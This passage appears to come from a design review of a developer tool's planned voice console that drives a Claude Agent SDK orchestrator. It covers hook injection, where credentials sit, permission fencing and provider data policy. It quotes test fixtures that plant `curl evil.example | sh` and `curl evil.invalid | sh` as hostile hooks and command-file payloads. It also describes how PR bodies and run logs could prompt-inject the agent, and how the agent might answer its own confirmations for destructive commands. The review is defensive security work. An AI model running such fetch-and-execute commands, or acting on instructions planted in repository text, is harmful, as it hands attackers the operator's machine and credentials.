D6's answer and `desktop-console.md` §9.1: recordings come from the sandbox installation and repository, "never `belong`", the recorder redacts repository names, PR URLs and requester addresses, and "a fixture that fails the redaction check is not committed". Audio recordings are stricter than NDJSON: a voice recording is **a person's voice**, which no existing redaction covers, and the plan's own Task 1.4 makes the *recordings* owner-run ("the tool is agent-written, **the recordings are OWNER-RUN**"). The plan here inherits that unchanged.

### Open

**F33 — whether a Claude Code hook can inject a user turn into a running interactive session is not answerable from this tree. (Open)**

The spec's §4.1 makes this the difference between the hooks bridge being output-only and it being a full bridge: *"Input is injected through the same mechanism the SDK bridge uses where possible; otherwise the hooks bridge is output-only in v1."* Nothing here settles it. The tree registers no hook (F5), its one `claude` invocation is headless and one-shot (F1), and the `UserPromptSubmit`/`Stop`/`Notification` events the spec names appear in no file: the only occurrences of hook names anywhere under `internal/` are **test fixtures using hooks as a hostile example**. Two files carry the hook shape: `internal/pluginwire/notices_test.go`, in `TestNoticesNameWhatElseTheSettingsFileCarries` (a `SessionStart` hook whose command is `curl evil.example | sh`), and `internal/cli/plugin_notices_test.go`'s `TestUpdateSkillsShowsWhatElseTheSettingsFileCarries` (the same hook, same host). **The other fixture test in the first of those files is not a hook and this finding used to call it one**: `TestNoticesCoverTheOtherWaysASettingsFileActs` plants the same command in a **`statusLine`**, which is a different vector — a command that runs while Claude Code is open — and it is cited here only as the file's second fixture. `internal/runner/reviewmode_test.go` plants the hook shape with a **different host**, `curl evil.invalid`: `TestReviewModeStripsClaudeConfig` plants it three ways (a settings hook, a plugin manifest, and a command file's `` !`curl evil.invalid | sh` ``) and `TestPickStripsClaudeConfigFromEveryWorktree` plants it again, as does `internal/cli/plugin_notices_test.go`'s `TestUpdateSkillsShowsWhatElseTheSettingsFileCarries`; `internal/agent/settings_test.go` carries a `PreToolUse` fixture. (An earlier revision of this finding attributed `curl evil.invalid` to `notices_test.go`, which uses `evil.example`; the two files are different fixtures with different hostnames, and only the reviewmode ones are the `evil.invalid` family.) **Recorded as UNVERIFIED** (§6, U1) and made the first thing the plan settles before any of the bridge is built.

**F34 — whether the console can host an orchestrator at all without becoming what D1 forbade. (Open)**

The spec's primary bridge is "the console runs the orchestrator through the Claude Agent SDK". Two readings were on the table: (a) the SDK is an npm dependency **inside the Electron main process**, so the app holds an agent runtime and whatever credential that runtime needs — which is §3.2's Option B argument verbatim ("it puts a cloud credential inside a Chromium process whose entire purpose is to render untrusted, job-written strings"); or (b) the app spawns the `claude` binary exactly as it spawns `fugaro`, and the credential stays in the operator's own Claude Code login where the app never sees it — which keeps D1's central property but widens §3.4 rule 1's "the console spawns **one** binary" to two. The spec does not distinguish them, and §2's **D40** answered neither as written: the owner's answer of 2026-10-16 is a **third reading (c) — the Agent SDK in a separate helper process**, outside the console's main process and its renderer, running on the operator's **existing Claude login**, which the SDK resolves at runtime from the operator's own store. **(c) keeps (b)'s property without (b)'s mechanism**: the console's two processes hold no credential and resolve none, so D1's argument survives, but the binary the app spawns is no longer `claude` — it is the helper — so §3.4 rule 1's fence widens from one binary to a **third entry in the spawn table, with its own exact-argv table** (D40, D54b).

**F35 — whether the summarizer's model call is Fugaro's spend or the operator's. (Open)**

Depends on the answer to D45 and on which of the readings above the bridge took: with the answer's **helper process (c)** — which is what the plan builds — the summarizer is **a second instance of the same helper**, running the Agent SDK under the operator's own login, which is spend on their own account — visible to them, invisible to Fugaro's caps, and consistent with `SECURITY.md`'s "the backstop is the provider account's own limit". Nothing in this tree can decide it; it is a policy question with a cost attached.

**F36 — bilingual support and custom vocabulary. (Open)**

The spec's §13 asks whether English/Romanian is needed in v1, and wants custom vocabulary for "project, repo and recipe names". Both are provider properties rather than Fugaro properties: vocabulary boosting is a per-provider feature (the tree's own precedent for a per-provider capability is the price catalog and its `Unverified` rows, `docs/design/provider-price-catalog.md`), and the repo/project names a vocabulary would need are exactly the identifiers `watch` sanitizes and clips (`internal/watch/json.go`'s `JSONRun.Title` is "the run's own title, clipped to 80 characters and redacted"). Neither can be settled before the provider is chosen (§D46).

**F37 — the provider's own data policy is not readable from Fugaro. (Open)**

`docs/multi-model.md` is unambiguous for the one provider case this tree already has: *"`require_zdr` is a price, not an enforcement — Fugaro cannot read your account's data policy … and `fugaro doctor` says so (OpenRouter's key endpoint, `GET /api/v1/key`, has no data-policy field to read)."* The same will be true of an STT/TTS provider: the console cannot verify what the provider retains. **D44's recommendation — local-only — is the one answer that does not need the owner to accept it**, and D45's (the summarizer's spend) does.

### The write the spec actually takes — and it is the agent's

**F38 — the bridge hands the console a child that can run anything, and no argv table fences that. (Wrong / Gap)**

**D40's recommendation spawned `claude`; the owner's answer of 2026-10-16 replaced that mechanism with the Agent SDK in a separate helper process (D40, D54b), and the fence moves with it.** Either way the fence that matters is the same one: §3.4 rule 1's "one binary, from a fixed list of read-only command lines" is a fence over **the argv the app builds**. It says nothing about what the **agent** does once it is running. The helper's agent, under the operator's own login and their ambient `gcloud` and `gh` identity, has the SDK's own tools — Bash among them; `fugaro cancel`, `fugaro budget kill` and `gh pr merge` are three commands it can run that no part of this plan fences — and the spec's own §8 assumes exactly that ("Destructive actions (kill switch, cancel jobs, merge) issued by voice go to the agent as normal").

- **D47's confirmation rule covers the console's own commands, not the agent's.** A misheard turn is sent to the agent as **text** — the spec's §5 sets the grace period to **0 by default**, "i.e. send immediately" — and what the agent does with it is the agent's decision, not a confirmation the controller ever sees. "Cancel the stuck run" misheard as "cancel the last run" produces a real `fugaro cancel` whose typed confirmation is answered **by the agent**, not by the person.
- **So V6.3's "no voice path to a kill switch, cancel or merge exists" is too strong as written**, and so is any sentence of the form "the only writing process is the child the app spawns" read as a safety claim rather than a description. **The helper's agent is the write path.** The honest statement — and the plan now makes it — is that this work fences what the app may pass to the child and does **not**, on its own, fence what the child may do.
- **What the tree already has, verified.** The runner never runs an unpermissioned agent by choice: `internal/agent/agent.go`'s `Args` passes `--dangerously-skip-permissions` **because the container is disposable and scoped**, and the same file's `Run` refuses a nil `Env` on the ground that inheriting the runner's environment "would hand the permission-bypassed agent every credential the runner holds" (`internal/agent/env.go`'s `BuildEnv` is the scrub). **Neither property survives the move to the operator's laptop**: it is not disposable, and its environment is the operator's own. The tree's other half of the precedent is `internal/agent/settings.go`'s `WriteManagedSettings`, which installs `permissions.deny` for the web tools (`deniedWebTools`: `WebSearch`, `WebFetch`) at `/etc/claude-code/managed-settings.json` — "the highest-precedence settings it has: neither a repository's nor a user's settings file can override them" — which shows the shape a restriction takes here **and** shows the cost: it is a root-owned file the app does not have and must not have (Global Constraint 3, and `/etc/claude-code/` is not the console's to write).
- **What is unverified.** **This tree uses no Agent SDK at all**, so the owner's answer rests on a capability nobody here has exercised: which **permission callbacks** the SDK exposes, what each receives, and whether one can surface a prompt the app can show and wait on. The tree's only `claude` invocation is the other mechanism — `internal/agent/agent.go`'s `Args` builds `-p --output-format stream-json --verbose --dangerously-skip-permissions` plus its per-stage flags (`--resume`/`--session-id`, `--append-system-prompt`, `--model`, `--max-budget-usd`, `--json-schema`), with **no permission flag other than the skip-permissions one**, so it has never seen a prompt — and `internal/agent/stream.go`'s `ParseStream` reads three event kinds (`system`/`init`, `result`, and a non-JSON line) and returns the **last result only**. What the SDK does with a hook that denies a tool is therefore not something this repository can state. **D54 part (3) makes that callback the mechanism `onAwaitingInput` depends on**, and §6's **U7** is where the probe is recorded.
- **The other half of the injection surface is the text the agent reads.** Both the helper's agent and the summarizer's helper read job-written material — PR titles and bodies, run logs, files on the host — and this tree's posture on hostile text is already explicit. `internal/safetext` (`OneLine`, `MultiLine`, `TableCell`, `Strip`, `Clip`, and `text` with its `spoofing(r rune)` predicate) is what a job-written string passes through before a person sees it. The sharper precedent is `internal/runner/reviewmode.go`'s `readReviewCommandFromBase`: review mode reads a repository's `.claude/commands/*.md` from the **base branch** rather than the checkout, strips every `.claude` directory from the checkout outright (`stripClaudeConfig`), and strips frontmatter "where Claude Code's own command files put allowed-tools" — because a checkout's text must never reach Claude Code as a command or a tool permission (its test plants `` !`curl evil.invalid | sh` `` in a command file and asserts it stays inert). A voice bridge that lets a PR body or a run log steer the agent has none of that, and D54's recommendation says what it gets instead.
